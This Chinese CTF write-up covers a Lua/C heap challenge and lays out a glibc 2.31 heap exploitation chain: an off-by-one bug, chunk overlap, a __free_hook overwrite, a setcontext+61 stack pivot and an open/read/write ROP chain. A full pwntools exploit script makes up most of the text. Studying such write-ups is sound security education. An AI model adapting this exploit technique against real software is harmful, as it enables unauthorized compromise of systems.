到这里基本清楚程序存在offbyone漏洞，沙箱限制getshell，onegadgetsystem('/bin/sh')不好用了，只能读取flag，可以构造orw读取flag，可通过制造堆块重叠来打__free_hook, 修改freehook为setcontext+61的思路去刷新环境，进行堆栈迁移，构造orw，读取flag。
这里setcontext+61关键的寄存器是rdx，setcontext+61片段如下：
```asm
.text:00000000000580DD                 mov     rsp, [rdx+0A0h]  <------setcontext+61------->刷新rsp到heap,指向orw ROP链
.text:00000000000580E4                 mov     rbx, [rdx+80h]
.text:00000000000580EB                 mov     rbp, [rdx+78h]
.text:00000000000580EF                 mov     r12, [rdx+48h]
.text:00000000000580F3                 mov     r13, [rdx+50h]
.text:00000000000580F7                 mov     r14, [rdx+58h]
.text:00000000000580FB                 mov     r15, [rdx+60h]
.text:00000000000580FF                 test    dword ptr fs:48h, 2
.text:000000000005810B                 jz      loc_581C6

.text:00000000000581C6 loc_581C6:                              ; CODE XREF: setcontext+6B↑j
.text:00000000000581C6                 mov     rcx, [rdx+0A8h] <-----rcx = ret,入栈>
.text:00000000000581CD                 push    rcx
.text:00000000000581CE                 mov     rsi, [rdx+70h]
.text:00000000000581D2                 mov     rdi, [rdx+68h]
.text:00000000000581D6                 mov     rcx, [rdx+98h]
.text:00000000000581DD                 mov     r8, [rdx+28h]
.text:00000000000581E1                 mov     r9, [rdx+30h]
.text:00000000000581E5                 mov     rdx, [rdx+88h]
.text:00000000000581E5 ; } // starts at 580A0
.text:00000000000581EC ; __unwind {
.text:00000000000581EC                 xor     eax, eax
.text:00000000000581EE                 retn                  <--------ret ->ret ->orw ROP >
```
在此之前需要将heap地址赋值给rdx，然后才能将栈迁移到堆上，我们知道free的时候第一个参数rdi是当前chunk的地址，那么只要将rdi的值赋值给rdx之后再返回到setcontext+61就行了，怎么找gadget能实现如上功能呢？我们在libc的function getkeyserv_handle里能找到如下gadget：
```asm
.text:0000000000154930                 mov     rdx, [rdi+8]
.text:0000000000154934                 mov     [rsp+0C8h+var_C8], rax
.text:0000000000154938                 call    qword ptr [rdx+20h]
```
所以在当前chunk+8的地方放当前heap地址可以实现给rdx赋值，然后在rdx+0x20处放setcontext地址就会返回到setcontext，在rdx+0xa0处放置orw Rop的开始地址，并将rsp指针刷新到指定heap上，执行到ret的时候将rcx移出栈顶，紧接着ret后返回orw的rop开始处，此时rsp和堆栈同时指向orw ROP开始处，开始在heap上构造orw读取flag。
构造赋值想让的步骤如下：
1. 通过largebinattack泄露libc，获得freehook、setcontext、rop链地址
2. 在制造chunk overlap之前应该将0x30大小的堆填满，释放，之后在新申请的chunk之间就不会有0x30大小的chunk相隔，才能制造overlap。原因猜测是为之后的申请腾空间，所以后面申请的就不会隔开了，具体原因待查
3. 泄露heap地址，制造chunk overlap
4. 写入freehook地址，修改freehook为gadget（set rdx && call setcontext）
5. 申请一个chunk，构造rop修改rdx，返回setcontext，刷新堆栈，之后orw
6. free触发rop链，orw读取flag


## exp
```python
from pwn import *
from gmssl import func
context.log_level = 'debug'
context.terminal = ["/usr/bin/tmux","sp","-h"]

#io = remote('127.0.0.1', 6010)
# libc = ELF('./libc-2.31.so')
# io = process(['./test', 'real'])
io = process('./pwn')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

l64 = lambda      :u64(io.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(io.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
rl = lambda	a=False		: io.recvline(a)
ru = lambda a,b=True	: io.recvuntil(a,b)
rn = lambda x			: io.recvn(x)
sn = lambda x			: io.send(x)
sl = lambda x			: io.sendline(x)
sa = lambda a,b			: io.sendafter(a,b)
sla = lambda a,b		: io.sendlineafter(a,b)
irt = lambda			: io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data		: u32(data.ljust(4, b'\x00'))
uu64 = lambda data		: u64(data.ljust(8, b'\x00'))
ur64 = lambda data		: u64(data.rjust(8, b'\x00'))
initkey = p64(0x6b8b4567327b23c6)


table = [
  0xBE, 0xD1, 0x90, 0x88, 0x57, 0x00, 0xE9, 0x53, 0x10, 0xBD, 
  0x2A, 0x34, 0x51, 0x84, 0x07, 0xC4, 0x33, 0xC5, 0x3B, 0x53, 
  0x5F, 0xA8, 0x5D, 0x4B, 0x6D, 0x22, 0x63, 0x5D, 0x3C, 0xBD, 
  0x47, 0x6D, 0x22, 0x3F, 0x38, 0x4B, 0x7A, 0x4C, 0xB8, 0xCC, 
  0xB8, 0x37, 0x78, 0x17, 0x73, 0x23, 0x27, 0x71, 0xB1, 0xC7, 
  0xA6, 0xD1, 0xA0, 0x48, 0x21, 0xC4, 0x1B, 0x0A, 0xAD, 0xC9, 
  0xA5, 0xE6, 0x14, 0x18, 0xFC, 0x7B, 0x53, 0x59, 0x8B, 0x0D, 
  0x07, 0xCD, 0x07, 0xCC, 0xBC, 0xA5, 0xE0, 0x28, 0x0E, 0xF9, 
  0x31, 0xC8, 0xED, 0x78, 0xF4, 0x75, 0x60, 0x65, 0x52, 0xB4, 
  0xFB, 0xBF, 0xAC, 0x6E, 0xEA, 0x5D, 0xCA, 0x0D, 0xB5, 0x66, 
  0xAC, 0xBA, 0x06, 0x30, 0x95, 0xF4, 0x96, 0x42, 0x7A, 0x7F, 
  0x58, 0x6D, 0x83, 0x8E, 0xF6, 0x61, 0x7C, 0x0E, 0xFD, 0x09, 
  0x6E, 0x42, 0x6B, 0x1E, 0xB9, 0x14, 0x22, 0xF6, 0x16, 0xD2, 
  0xD2, 0x60, 0x29, 0x23, 0x32, 0x9E, 0xB4, 0x82, 0xEE, 0x58, 
  0x3A, 0x7D, 0x1F, 0x74, 0x98, 0x5D, 0x17, 0x64, 0xE4, 0x6F, 
  0xF5, 0xAD, 0x94, 0xAA, 0x89, 0xE3, 0xBE, 0x98, 0x91, 0x38, 
  0x70, 0xEC, 0x2F, 0x5E, 0x9F, 0xC9, 0xB1, 0x26, 0x3A, 0x64, 
  0x48, 0x13, 0xF1, 0x1A, 0xC5, 0xD5, 0xE5, 0x66, 0x11, 0x11, 
  0x3A, 0xAA, 0x79, 0x45, 0x42, 0xB4, 0x57, 0x9D, 0x3F, 0xBC, 
  0xA3, 0xAA, 0x98, 0x4E, 0x6B, 0x7A, 0x4A, 0x2F, 0x3E, 0x10, 
  0x7A, 0xC5, 0x33, 0x8D, 0xAC, 0x0B, 0x79, 0x33, 0x5D, 0x09, 
  0xFC, 0x9D, 0x9B, 0xE5, 0x18, 0xCD, 0x1C, 0x7C, 0x8B, 0x0A, 
  0xA8, 0x95, 0x56, 0xCC, 0x4E, 0x34, 0x31, 0x33, 0xF5, 0xC1, 
  0xF5, 0x03, 0x0A, 0x4A, 0xB4, 0xD1, 0x90, 0xF1, 0x8F, 0x57, 
  0x20, 0x05, 0x0D, 0xA0, 0xCD, 0x82, 0xB3, 0x25, 0xD8, 0xD2, 
  0x20, 0xF3, 0xC5, 0x96, 0x35, 0x35
]

def encode(key,passwd):
	key = func.bytes_to_list(key)
	passwd = func.bytes_to_list(passwd)
	key_arr = [] 
	raw_key = [] 
	data_arr = [] 
	for c in key: 
		key_arr.append(c) 
		raw_key.append(c) 
	for c in passwd: 
		data_arr.append(c) 
	key = key_arr 
	passwd = data_arr	
	for i in range(len(passwd)):	
		v5 = (key[(i + 2) & 7] * (key[(i & 7)] + key[(i + 1) & 7]) + key[(i + 3) & 7])&0xff
		passwd[i] ^= v5 ^ table[v5]
		key[(i & 7)] = (2 * v5 + 3)&0xff
		if (i & 0xf) == 0:
			key = sub_143A(raw_key,table[i&0xff])

	out = b''
	for i in passwd:
		out += i.to_bytes(1, byteorder='little')

	return out      
	
	
def sub_143A(key,seed):
	tmpkey = [0]*8
	for  i in range(8):
		tmpkey[i] = (key[i] ^ table[key[i]])&0xff
		tmpkey[i] ^= (seed + i)&0xff 
	return tmpkey
	
	
passwdd = p32(0x00000000)
password = encode(initkey,passwdd)
print(hex(int.from_bytes(password,byteorder='little',signed=False))) #0x18f7d121 418894113

def login():
	print(111)
	sla('$','login')
	sla('account:','1000')
	sla('password:','418894113')
def add(size,content):
	sla('$','add')
	sla('?',str(size))
	sn(content)
def delete(idx):
	sla('$','del')
	sla('?',str(idx))
def get(idx):
	sla('$','get')
	sla('?',str(idx))
			
login()
# leak libc  larginbin attack
add(0x500,'\n') #0
add(0x500,'\n') #1

delete(0) 
add(0x500,'\n') #0
get(0)
ru('\n')
libc_base = uu64(rn(6)) - 0x1c6b0a - 0x25000
lg('libc_base')


free_hook = libc_base + libc.sym['__free_hook'] 
lg('free_hook')
setcontext = libc_base + libc.sym['setcontext'] + 61 
lg('setcontext')

ret = libc_base + 0x25679 
libc_open = libc_base + libc.sym['open'] 
libc_read = libc_base + libc.sym['read'] 
libc_write = libc_base + libc.sym['write'] 
pop_rdi = libc_base + 0x26b72 
pop_rsi = libc_base + 0x27529 
pop_rdx_r12 = libc_base + 0x000000000011c371 # pop rdx ; pop r12 ; ret 

gadget = libc_base + 0x154930 # local getkeyserv_handle  set rdx && call context
'''
.text:0000000000154930                 mov     rdx, [rdi+8]
.text:0000000000154934                 mov     [rsp+0C8h+var_C8], rax
.text:0000000000154938                 call    qword ptr [rdx+20h]
'''

# fill size=0x30 chunk
add(0x80, '\n') # 2 
add(0x20, '\n') # 3 
b = 3 
j = 20 

for i in range(b, j): 
	add(0x20, 'AAA\n') 

for i in range(b + 10, j): 
	delete(i) 
# make overlap chunk
add(0x98, encode(initkey, b'AAA') + b'\n') # 13 
add(0x500, encode(initkey, b'AAA') + b'\n') # 14 
dbg()
add(0xa0, 'AAA\n') # 15 
add(0xa0, 'AAA\n') # 16 
add(0xa0, 'AAA\n') # 17 
delete(13) 
delete(17) 
delete(16) 
delete(15) 
# leak heap addr 
add(0xa8, b'\n') # 13 
get(13) 
io.recvuntil('\n')
heap = u64(io.recv(6).ljust(8, b'\x00')) - 0xa + 0x50+0xb0*2 +0x10# local  chunk17's heapaddr
#heap = u64(io.recv(6).ljust(8, b'\x00')) - 0xa + 0x200 # local 
lg('heap')

delete(13)
p = b'\x00' + b'\x11' * 0x97 
#dbg()
add(0x98, encode(initkey, p) + b'\xc1') # 13 
# overlap
delete(14) 
# 5c0 
p = b'A' * 0x500 
p += p64(0) + p64(0xb1) 
p += p64(libc_base + libc.sym['__free_hook']) + p64(0) 
add(0x5b0, encode(initkey, p) + b'\n') # 14 
# remalloc freehook 
add(0xa8, encode(initkey, b"/bin/sh\x00") + b'\n') # 13 
add(0xa8, encode(initkey, p64(gadget)) + b'\n') # modify __free_hook as a gadget set rdi -> rdx 
p = p64(1) + p64(heap) # set to rdx
p += p64(setcontext) *4 # call setcontext
p = p.ljust(0xa0, b'\x11') 
p += p64(heap + 0xb0) # rsp 
p += p64(ret) # rcx 
rop = p64(pop_rdi) + p64(heap + 0xb0 + 0x98 + 0x18) 
rop += p64(pop_rsi) + p64(0) 
rop += p64(pop_rdx_r12) + p64(0) + p64(0) 
rop += p64(libc_open) 
rop += p64(pop_rdi) + p64(3) 
rop += p64(pop_rsi) + p64(heap) 
rop += p64(pop_rdx_r12) + p64(0x80) + p64(0) 
rop += p64(libc_read) 
rop += p64(pop_rdi) + p64(1) 
rop += p64(libc_write) 
rop += p64(pop_rdi) + p64(0) 
rop += p64(libc_read) 
p += rop 
p += b'./flag\x00' 
add(0x800, encode(initkey, p) + b'\n') # 17 

print('get flag...') 
# triggger free
delete(17)
#dbg()
irt()

```
## 总结
这次比赛算这道题目是压轴题，做出来的人数个位数，题目参杂了很多知识，包括lua语言、c和lua互调规则、沙箱禁用59号中断、ORW、花指令、简单异或流加密、offbyone、lua程序在互调过程中申请chunk的处理，想要做出来不容易，之后复盘也是复盘了好久才看明白，之前不知道freehook修改成setcontext的利用方式，这次明白了，利用setcontext+61，刷新栈到指定堆上，然后构造orw。
## 出题思路
1. lua、c互调，增加pwn题的逆向难度
2. 花指令隐藏关键函数逻辑，可以隐藏漏洞点
3. offbyone，seccomp禁用59号调用，只能读取flag
4. freehook攻击setcontext，构造orw，环境2.31
进一步增加难度，修改lua虚拟机opcode，使得通用反编译失败，需要逆向opcode顺序，重新编译反编译工具，这就更变态了。

# 附件
[附件](https://github.com/1094093288/IMG/tree/master/Pwn/2021anxunbei)